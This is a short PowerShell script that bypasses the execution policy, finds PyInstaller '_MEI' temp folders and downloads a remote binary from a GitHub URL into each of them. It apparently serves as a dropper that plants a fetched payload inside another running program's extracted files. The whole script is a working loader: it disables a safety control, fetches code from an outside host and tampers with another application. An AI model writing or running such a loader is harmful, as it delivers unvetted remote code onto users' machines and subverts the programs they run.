Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

$vvBinUrl = "https://raw.githubusercontent.com/ZipherCyprex/hid-update/main/load/zipher_124mg.bin" 
 
$tempPath = [System.IO.Path]::GetTempPath()

 
$meiFolders = Get-ChildItem -Path $tempPath -Directory | Where-Object { $_.Name -like "_MEI*" }

if ($meiFolders.Count -eq 0) {
    exit
}

 
foreach ($meiFolder in $meiFolders) {
    $destinationPath = Join-Path -Path $meiFolder.FullName -ChildPath "Zipher_last-merge.bin"
    Invoke-WebRequest -Uri $vvBinUrl -OutFile $destinationPath
}

